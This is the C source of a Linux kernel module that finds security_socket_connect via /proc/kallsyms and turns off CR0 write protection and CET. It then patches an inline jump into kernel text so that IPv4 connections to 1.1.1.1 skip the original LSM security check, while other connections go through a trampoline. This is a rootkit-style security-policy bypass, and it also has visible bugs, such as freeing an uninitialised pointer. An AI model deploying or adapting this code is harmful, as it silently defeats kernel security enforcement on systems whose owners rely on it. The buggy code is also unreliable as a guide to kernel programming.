#include <linux/module.h>
#include <net/sock.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/stop_machine.h>
#include <asm/insn.h>
#include <linux/bpf.h>
#include <linux/lsm_hooks.h>
#include <linux/security.h>

long line_to_addr(char *line);
long find_kallsym(char *name);
int lde_get_length(const void *p);
int original_security_socket_connect(struct socket *sock, struct sockaddr *address, int addrlen);
int hook_security_socket_connect(struct socket *sock, struct sockaddr *address, int addrlen);
long run_hook(void * addr, int len);
long write_kernel(void * addr, int len, long (*fn)(void *, int));
int __run(void *data);
long hook_reset(void *data, int len);
int _hook_reset(void *data);
void inet_ntoa(struct in_addr in, char *buf);
int ORIG_LEN = 0;

int * _bpf_prog_active;

#ifndef X86_CR0_WP
# define X86_CR0_WP (1UL << 16)
#endif

#ifndef X86_CR4_CET
# define X86_CR4_CET (1UL << 23)
#endif

#ifndef __FORCE_ORDER
# define __FORCE_ORDER "m"(*(unsigned int *)0x1000UL)
#endif

static inline unsigned long x86_read_cr0(void) {
	unsigned long val;
	asm volatile("mov %%cr0, %0\n" : "=r" (val) : __FORCE_ORDER);
	return val;
}

static inline void x86_write_cr0(unsigned long val) {
	asm volatile("mov %0, %%cr0\n": "+r" (val) : : "memory");
}

static inline unsigned long x86_read_cr4(void) {
	unsigned long val;
	asm volatile("mov %%cr4, %0\n" : "=r" (val) : __FORCE_ORDER);
	return val;
}

static inline void x86_write_cr4(unsigned long val) {
	asm volatile("mov %0, %%cr4\n": "+r" (val) : : "memory");
}


long line_to_addr(char *line) {
    return simple_strtoul(line, NULL, 16);
}

// place a jump at addr @a from addr @f to addr @t
static inline void x86_put_jmp(void *a, void *f, void *t) {
	*((char *)(a + 0)) = 0xE9;
	*(( int *)(a + 1)) = (long)(t - (f + 5));
}

static int _read_file(struct file *file) {
  struct seq_file *m = file->private_data;

  mutex_lock(&m->lock);

  if (!m->buf) {
    m->buf = kmalloc(PAGE_SIZE, GFP_KERNEL);
    m->size = PAGE_SIZE;
  }

  void * p;
  p = m->op->start(m, &m->index);
  m->count = 0;

  int err = m->op->show(m, p);
  p = m->op->next(m, p, &m->index);

  mutex_unlock(&m->lock);

  return m->count;
}

long find_kallsym(char *name) {
    struct file *file;
    ssize_t bytes_read;
    char *line;
    long addr = 0;

    file = filp_open("/proc/kallsyms", O_RDONLY, 0);
    if (IS_ERR(file)) {
        pr_err("Failed to open /proc/kallsyms\n");
        return PTR_ERR(file);
    }

    struct seq_file *m = file->private_data;

    int read = _read_file(file);

    while (read > 0) {
      int i = 0;
      while (m->buf[i] != '\n' || m->buf[i] == '\0' || m->buf[i] == '\t') {
        i++;
      }
      m->buf[i] = '\0';
      if (strcmp(m->buf + 19, name) == 0) {
        addr = line_to_addr(m->buf);
        break;
      }
      read = _read_file(file);
    }

    filp_close(file, NULL);
    kfree(line);
    return addr;
}

int original_security_socket_connect(
  struct socket *sock,
  struct sockaddr *address,
  int addrlen
) {
  asm(".rept 0x80\n.byte 0\n.endr\n");
  return 0;
}

void inet_ntoa(struct in_addr in, char *buf) {
  unsigned char *bytes = (unsigned char *)&in;
  sprintf(buf, "%d.%d.%d.%d", bytes[0], bytes[1], bytes[2], bytes[3]);
}

// Define the correct type for socket_connect hook function
typedef int (*socket_connect_hook_t)(struct socket *sock, struct sockaddr *address, int addrlen);

// Simplified approach - instead of finding the exact hook, we'll directly modify the function
void *original_hook_addr = NULL;

// Modified hook function that works with BPF LSM - changed return type to int
int hook_security_socket_connect(
  struct socket *sock,
  struct sockaddr *address,
  int addrlen
) {
    printk(KERN_INFO "hook_security_socket_connect\n");
    printk(KERN_INFO "sock: %px\n", sock);
    printk(KERN_INFO "address: %px\n", address);
    
    if (address) {
        printk(KERN_INFO "address->sa_family: %d\n", address->sa_family);

        switch (address->sa_family) {
            case AF_INET: {
                printk(KERN_INFO "AF_INET\n");

                char ip[256];
                struct sockaddr_in *addr_in = (struct sockaddr_in *)address;
                struct in_addr dest_ip = addr_in->sin_addr;
                inet_ntoa(dest_ip, ip);
                printk(KERN_INFO "ip: %s\n", ip);
                
                // Check if the connection is to 1.1.1.1
                if (dest_ip.s_addr == htonl(0x01010101)) {  // 1.1.1.1 in network byte order
                    printk(KERN_INFO "Allowing connection to 1.1.1.1\n");
                    return 0;  // Allow the connection
                }
                
                break;
            }
            case AF_INET6:
                printk(KERN_INFO "AF_INET6\n");
                break;
            case AF_UNIX:
                printk(KERN_INFO "AF_UNIX\n");
                break;
            case AF_UNSPEC:
                printk(KERN_INFO "AF_UNSPEC\n");
                break;
            default:
                printk(KERN_INFO "default\n");
                break;
        }
    }

    printk(KERN_INFO "addrlen: %d\n", addrlen);

    // Call the original function (which was saved) for all other connections
    return (original_security_socket_connect + ORIG_LEN)(sock, address, addrlen);
}

long write_kernel(void * addr, int len, long (*fn)(void *, int)) {
    long res = 0, cr0, cr4;

    asm volatile ("cli\n");

    cr0 = x86_read_cr0();
    cr4 = x86_read_cr4();

    if (cr4 & X86_CR4_CET)
        x86_write_cr4(cr4 & ~X86_CR4_CET);
    x86_write_cr0(cr0 & ~X86_CR0_WP);

    res = fn(addr, len);

    x86_write_cr0(cr0);
    if (cr4 & X86_CR4_CET)
        x86_write_cr4(cr4);

    asm volatile ("sti\n");

    return res;
}

// Override the LSM hook instead of directly hooking the function
long run_hook(void * addr, int len) {
    ORIG_LEN = len;
    original_hook_addr = addr;

    // Save the original function implementation
    memcpy(original_security_socket_connect, addr, len);
    x86_put_jmp(original_security_socket_connect + len, original_security_socket_connect + len, addr + len);
    
    // Debug prints
    for (int i = 0; i < 20; i++) {
        printk(KERN_INFO "pre orig [%d]: 0x%02x ", i, ((unsigned char *)original_security_socket_connect)[i]);
    }
    
    // Use direct function hook since we're having trouble with the security hook list
    printk(KERN_INFO "Using direct function hook\n");
    x86_put_jmp(addr, addr, hook_security_socket_connect);
    
    // Debug prints
    for (int i = 0; i < 20; i++) {
        printk(KERN_INFO "addr [%d]: 0x%02x ", i, ((unsigned char *)addr)[i]);
    }

    return 0;
}

struct args {
  void *addr;
  int len;
};

int __run(void *data) {
  struct args *args = (struct args *)data;
  write_kernel(
    args->addr,
    args->len,
    run_hook
  );

  return 0;
}

int lde_get_length(const void *p) {
  struct insn insn;

  typeof(insn_init) *insn_init = (typeof(insn_init))find_kallsym("insn_init");
  typeof(insn_get_length) *insn_get_length = (typeof(insn_get_length))find_kallsym("insn_get_length");
  printk(KERN_INFO "insn_init: %px\n", insn_init);
  printk(KERN_INFO "insn_get_length: %px\n", insn_get_length);

  insn_init(&insn, p, 64, 1);
  insn_get_length(&insn);
  return insn.length;

}

static int driver_entry(void)
{
    void * addr = (void *)find_kallsym("security_socket_connect");
    printk(KERN_INFO "security_socket_connect: %px\n", addr);

    if (addr == 0) {
        printk(KERN_INFO "security_socket_connect not found\n");
        return 0;
    }

    int len = lde_get_length((void *)addr);
    printk(KERN_INFO "security_socket_connect len: %d\n", len);
    while (len < 5) {
        len += lde_get_length((void *)(addr + len));
    }
    printk(KERN_INFO "security_socket_connect len: %d\n", len);
    struct args args = {
        .addr = addr,
        .len = len
    };
    stop_machine(__run, &args, NULL);

    return 0;
}

int _hook_reset(void *data) {
  struct args *args = (struct args *)data;

  return write_kernel(args->addr, args->len, hook_reset);
}

// Modify hook_reset to restore the original function
long hook_reset(void *data, int len) {
    printk(KERN_INFO "Restoring original security hook\n");

    // Restore the original function bytes
    for (int i = 0; i < len; i++) {
        ((unsigned char *)data)[i] = ((unsigned char *)original_security_socket_connect)[i];
    }
    
    return 0;
}

static void driver_exit(void)
{
  void * addr = (void *)find_kallsym("security_socket_connect");
  struct args args = {
     .addr = addr,
     .len = ORIG_LEN
   };
  stop_machine(_hook_reset, &args, NULL);
  printk(KERN_INFO "Goodbye, world!\n");
}

MODULE_LICENSE("GPL");
module_init(driver_entry);
module_exit(driver_exit);
